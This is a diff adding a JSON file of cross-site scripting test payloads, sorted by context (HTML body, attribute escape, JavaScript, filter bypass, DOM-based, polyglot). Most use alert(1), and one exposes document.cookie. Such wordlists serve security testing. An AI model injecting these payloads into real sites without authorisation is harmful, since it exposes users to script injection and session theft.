@@ -1,0 +1,60 @@
+{
+  "html_body": [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<marquee onstart=alert(1)>",
+    "<video><source onerror=alert(1)>",
+    "<audio src=x onerror=alert(1)>",
+    "<input onfocus=alert(1) autofocus>",
+    "<select autofocus onfocus=alert(1)>",
+    "<textarea autofocus onfocus=alert(1)>",
+    "<iframe src='javascript:alert(1)'>",
+    "<object data='javascript:alert(1)'>",
+    "<embed src='javascript:alert(1)'>",
+    "<a href='javascript:alert(1)'>click</a>",
+    "<math><mtext></mtext><mglyph><svg><mtext><style><img src onerror=alert(1)>",
+    "<div style='animation-name:x' onanimationstart=alert(1)>"
+  ],
+  "attribute_escape": [
+    "\" onmouseover=\"alert(1)\" x=\"",
+    "' onmouseover='alert(1)' x='",
+    "\" onfocus=\"alert(1)\" autofocus x=\"",
+    "\"><script>alert(1)</script><\"",
+    "'><script>alert(1)</script><'",
+    "\"><img src=x onerror=alert(1)><\"",
+    "\" onclick=\"alert(1)\"",
+    "' onclick='alert(1)'"
+  ],
+  "javascript_context": [
+    "';alert(1);//", "\";alert(1);//",
+    "</script><script>alert(1)</script>",
+    "'-alert(1)-'", "\"-alert(1)-\"",
+    "\\';alert(1);//", "\\\\\";alert(1);//"
+  ],
+  "filter_bypass": [
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "<img src=x oNeRrOr=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "%3Cscript%3Ealert(1)%3C/script%3E",
+    "<img src=x onerror=alert`1`>",
+    "<svg onload=alert&#x28;1&#x29;>",
+    "<svg><script>alert&lpar;1&rpar;</script>",
+    "jaVasCript:alert(1)",
+    "&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)",
+    "<img src=x onerror='alert(1)'>",
+    "<<script>alert(1)//<</script>"
+  ],
+  "dom_based": [
+    "#<img src=x onerror=alert(1)>",
+    "#\"><img src=x onerror=alert(1)>",
+    "javascript:alert(document.cookie)"
+  ],
+  "polyglot": [
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+  ]
+}
